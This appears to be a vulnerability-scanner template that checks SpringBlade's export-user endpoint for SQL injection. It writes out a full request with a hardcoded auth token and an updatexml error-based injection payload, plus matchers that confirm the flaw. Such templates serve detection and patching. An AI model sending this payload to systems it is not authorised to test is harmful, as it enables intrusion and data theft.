id: poc-yaml-springblade-export-user-sqli
info:
  name: SpringBlade export-user SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags:
    - sql-injection
    - springblade
variables:
  t1: "{{rand_int(1,10000)}}"
  t2: "{{md5(t1)}}"
http:
  - raw:
      - |
        GET /api/blade-user/export-user?Blade-Auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9..UHWWVEc6oi6Z6_AC5_WcRrKS9fB3aYH7XZxL9_xH-yIoUNeBrFoylXjGEwRY3Dv7GJeFnl5ppu8eOS3YYFqdeQ&account=&realName=&1-updatexml(1,concat(0x7e,md5({{t1}}),0x7e),1)=1 HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "XPATH syntax error"
          - "{{t2}}"
      - type: word
        part: header
        words:
          - "application/json"
